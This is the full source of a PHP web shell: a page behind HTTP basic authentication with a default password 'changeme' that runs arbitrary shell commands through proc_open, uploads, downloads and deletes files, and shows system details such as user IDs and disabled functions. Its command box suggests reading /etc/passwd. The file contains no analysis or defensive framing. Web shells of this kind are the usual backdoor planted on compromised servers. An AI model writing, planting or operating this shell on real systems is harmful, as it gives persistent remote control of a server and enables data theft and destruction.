<?php
/**
 * PHP Web Shell
 * Provides remote command execution, file management, and system information.
 */

// Configuration
const PASSWORD = 'changeme';  // Change this immediately
const SESSION_NAME = 'ws_session';

// Security: Basic authentication
function auth() {
    if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW'])) {
        header('WWW-Authenticate: Basic realm="Web Shell"');
        header('HTTP/1.0 401 Unauthorized');
        exit('Authentication required');
    }
    return $_SERVER['PHP_AUTH_PW'] === PASSWORD;
}

// Initialize session
session_name(SESSION_NAME);
session_start();

if (!auth()) {
    exit;
}

// Handle commands
$output = '';
$cwd = getcwd();

if (isset($_POST['cmd']) && $_POST['cmd'] !== '') {
    $cmd = $_POST['cmd'];
    $output = execute_command($cmd, $cwd);
    if (strpos($cmd, 'cd ') === 0) {
        $new_dir = trim(substr($cmd, 3));
        if (is_dir($new_dir)) {
            chdir($new_dir);
            $cwd = getcwd();
        } else {
            $output = "Directory not found: $new_dir\n";
        }
    }
}

if (isset($_POST['upload']) && isset($_FILES['file'])) {
    $target = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        $output = "File uploaded: " . basename($_FILES['file']['name']) . "\n";
    } else {
        $output = "Upload failed\n";
    }
}

if (isset($_POST['download']) && isset($_POST['filepath'])) {
    $filepath = $_POST['filepath'];
    if (is_file($filepath) && is_readable($filepath)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($filepath) . '"');
        header('Content-Length: ' . filesize($filepath));
        readfile($filepath);
        exit;
    }
    $output = "File not found or not readable: $filepath\n";
}

if (isset($_POST['delete']) && isset($_POST['filepath'])) {
    $filepath = $_POST['filepath'];
    if (is_file($filepath) && unlink($filepath)) {
        $output = "File deleted: $filepath\n";
    } elseif (is_dir($filepath) && rmdir($filepath)) {
        $output = "Directory deleted: $filepath\n";
    } else {
        $output = "Delete failed: $filepath\n";
    }
}

function execute_command($cmd, $cwd) {
    $descriptors = [
        0 => ['pipe', 'r'],
        1 => ['pipe', 'w'],
        2 => ['pipe', 'w'],
    ];
    $process = proc_open($cmd, $descriptors, $pipes, $cwd);
    if (!is_resource($process)) {
        return "Failed to execute command\n";
    }
    $stdout = stream_get_contents($pipes[1]);
    $stderr = stream_get_contents($pipes[2]);
    foreach ($pipes as $pipe) {
        fclose($pipe);
    }
    $return_code = proc_close($process);
    return $stdout . $stderr . ($return_code !== 0 ? "\n[Exit code: $return_code]" : '');
}

function list_directory($path) {
    $items = [];
    if ($handle = opendir($path)) {
        while (false !== ($entry = readdir($handle))) {
            if ($entry === '.' || $entry === '..') continue;
            $full = $path . DIRECTORY_SEPARATOR . $entry;
            $items[] = [
                'name' => $entry,
                'path' => $full,
                'is_dir' => is_dir($full),
                'size' => is_file($full) ? filesize($full) : null,
                'perms' => substr(sprintf('%o', fileperms($full)), -4),
                'modified' => date('Y-m-d H:i:s', filemtime($full)),
            ];
        }
        closedir($handle);
    }
    usort($items, fn($a, $b) => ($a['is_dir'] === $b['is_dir']) ? strcmp($a['name'], $b['name']) : ($a['is_dir'] ? -1 : 1));
    return $items;
}

function format_size($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < count($units) - 1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

$files = list_directory($cwd);
$sys_info = [
    'php_version' => PHP_VERSION,
    'os' => PHP_OS,
    'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown',
    'user' => get_current_user(),
    'uid' => posix_getuid() ?? 'N/A',
    'gid' => posix_getgid() ?? 'N/A',
    'cwd' => $cwd,
    'memory_limit' => ini_get('memory_limit'),
    'max_execution_time' => ini_get('max_execution_time'),
    'safe_mode' => ini_get('safe_mode') ? 'On' : 'Off',
    'disabled_functions' => ini_get('disable_functions') ?: 'None',
];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Web Shell</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace; background: #1a1a2e; color: #eaeaea; line-height: 1.6; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #2d2d44; }
        h1 { font-size: 1.5rem; color: #00d9ff; }
        .sys-info { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; margin-bottom: 20px; font-size: 0.85rem; }
        .sys-info div { background: #16213e; padding: 10px; border-radius: 4px; border: 1px solid #2d2d44; }
        .sys-info span { color: #00d9ff; }
        .tabs { display: flex; gap: 5px; margin-bottom: 15px; }
        .tab { padding: 8px 16px; background: #16213e; border: 1px solid #2d2d44; border-bottom: none; border-radius: 4px 4px 0 0; cursor: pointer; color: #aaa; }
        .tab.active { background: #0f3460; color: #00d9ff; border-color: #00d9ff; }
        .panel { display: none; background: #16213e; border: 1px solid #2d2d44; border-radius: 0 4px 4px 4px; padding: 15px; }
        .panel.active { display: block; }
        .cmd-form { display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; }
        .cmd-form input[type="text"] { flex: 1; min-width: 300px; padding: 10px; background: #0f3460; border: 1px solid #2d2d44; border-radius: 4px; color: #eaeaea; font-family: inherit; font-size: 0.9rem; }
        .cmd-form button { padding: 10px 20px; background: #00d9ff; border: none; border-radius: 4px; color: #1a1a2e; font-weight: bold; cursor: pointer; font-family: inherit; }
        .cmd-form button:hover { background: #00b8d4; }
        .output { background: #0f0f1a; border: 1px solid #2d2d44; border-radius: 4px; padding: 15px; min-height: 200px; max-height: 500px; overflow: auto; white-space: pre-wrap; font-size: 0.85rem; }
        .file-table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
        .file-table th, .file-table td { padding: 8px 12px; text-align: left; border-bottom: 1px solid #2d2d44; }
        .file-table th { color: #00d9ff; background: #0f3460; }
        .file-table tr:hover { background: #0f3460; }
        .file-table a { color: #00d9ff; text-decoration: none; }
        .file-table a:hover { text-decoration: underline; }
        .dir { color: #ffd600; }
        .actions { white-space: nowrap; }
        .actions form { display: inline; margin-right: 5px; }
        .actions button { padding: 4px 8px; background: #e91e63; border: none; border-radius: 3px; color: white; cursor: pointer; font-size: 0.75rem; }
        .actions button:hover { background: #c2185b; }
        .actions button.download { background: #4caf50; }
        .actions button.download:hover { background: #388e3c; }
        .upload-form { display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; align-items: center; }
        .upload-form input[type="file"] { background: #0f3460; border: 1px solid #2d2d44; border-radius: 4px; padding: 8px; color: #eaeaea; }
        .upload-form button { padding: 8px 16px; background: #2196f3; border: none; border-radius: 4px; color: white; cursor: pointer; }
        .upload-form button:hover { background: #1976d2; }
        .footer { margin-top: 20px; text-align: center; color: #666; font-size: 0.75rem; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>PHP Web Shell</h1>
            <div><?= htmlspecialchars($sys_info['user']) ?>@<?= htmlspecialchars(gethostname() ?? 'unknown') ?>:<?= htmlspecialchars($cwd) ?></div>
        </header>

        <div class="sys-info">
            <div><span>PHP:</span> <?= $sys_info['php_version'] ?></div>
            <div><span>OS:</span> <?= $sys_info['os'] ?></div>
            <div><span>Server:</span> <?= $sys_info['server'] ?></div>
            <div><span>UID/GID:</span> <?= $sys_info['uid'] ?>/<?= $sys_info['gid'] ?></div>
            <div><span>Memory:</span> <?= $sys_info['memory_limit'] ?></div>
            <div><span>Max Time:</span> <?= $sys_info['max_execution_time'] ?>s</div>
            <div><span>Safe Mode:</span> <?= $sys_info['safe_mode'] ?></div>
            <div><span>Disabled:</span> <?= htmlspecialchars($sys_info['disabled_functions']) ?></div>
        </div>

        <div class="tabs">
            <div class="tab active" onclick="showTab('terminal')">Terminal</div>
            <div class="tab" onclick="showTab('files')">File Manager</div>
            <div class="tab" onclick="showTab('upload')">Upload</div>
        </div>

        <!-- Terminal Panel -->
        <div id="terminal" class="panel active">
            <form class="cmd-form" method="post" onsubmit="return handleCommand(event)">
                <input type="text" name="cmd" id="cmd-input" placeholder="Enter command (e.g., ls -la, whoami, cat /etc/passwd)" autocomplete="off" autofocus>
                <button type="submit">Execute</button>
            </form>
            <div class="output" id="output"><?= htmlspecialchars($output) ?></div>
        </div>

        <!-- File Manager Panel -->
        <div id="files" class="panel">
            <table class="file-table">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Perms</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($files as $file): ?>
                    <tr>
                        <td>
                            <a href="?path=<?= urlencode($file['path']) ?>" class="<?= $file['is_dir'] ? 'dir' : '' ?>">
                                <?= htmlspecialchars($file['name']) ?><?= $file['is_dir'] ? '/' : '' ?>
                            </a>
                        </td>
                        <td><?= $file['is_dir'] ? '-' : format_size($file['size']) ?></td>
                        <td><?= $file['perms'] ?></td>
                        <td><?= $file['modified'] ?></td>
                        <td class="actions">
                            <?php if (!$file['is_dir']): ?>
                                <form method="post" onsubmit="return confirm('Download <?= htmlspecialchars($file['name'], ENT_QUOTES) ?>?')">
                                    <input type="hidden" name="filepath" value="<?= htmlspecialchars($file['path']) ?>">
                                    <button type="submit" name="download" class="download">Download</button>
                                </form>
                            <?php endif; ?>
                            <form method="post" onsubmit="return confirm('Delete <?= htmlspecialchars($file['name'], ENT_QUOTES) ?>?')">
                                <input type="hidden" name="filepath" value="<?= htmlspecialchars($file['path']) ?>">
                                <button type="submit" name="delete">Delete</button>
                            </form>
                        </td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>

        <!-- Upload Panel -->
        <div id="upload" class="panel">
            <form class="upload-form" method="post" enctype="multipart/form-data">
                <input type="file" name="file" required>
                <button type="submit" name="upload">Upload File</button>
            </form>
            <p style="color: #888; font-size: 0.85rem;">Files upload to current directory: <?= htmlspecialchars($cwd) ?></p>
        </div>

        <div class="footer">
            PHP Web Shell | Change the default password in the source code
        </div>
    </div>

    <script>
        function showTab(tabName) {
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.getElementById(tabName).classList.add('active');
            event.target.classList.add('active');
            if (tabName === 'terminal') {
                document.getElementById('cmd-input').focus();
            }
        }

        function handleCommand(event) {
            const input = document.getElementById('cmd-input');
            const output = document.getElementById('output');
            const cmd = input.value.trim();
            if (!cmd) return false;

            // Show command in output
            output.textContent += '\n$ ' + cmd + '\n';

            // Submit form normally
            return true;
        }

        // Keep command history
        let history = [];
        let historyIndex = -1;
        const input = document.getElementById('cmd-input');
        input.addEventListener('keydown', (e) => {
            if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex < history.length - 1) {
                    historyIndex++;
                    input.value = history[history.length - 1 - historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    input.value = history[history.length - 1 - historyIndex];
                } else {
                    historyIndex = -1;
                    input.value = '';
                }
            }
        });

        // Capture submitted commands for history
        document.querySelector('.cmd-form').addEventListener('submit', () => {
            const cmd = input.value.trim();
            if (cmd && history[history.length - 1] !== cmd) {
                history.push(cmd);
            }
            historyIndex = -1;
        });
    </script>
</body>
</html>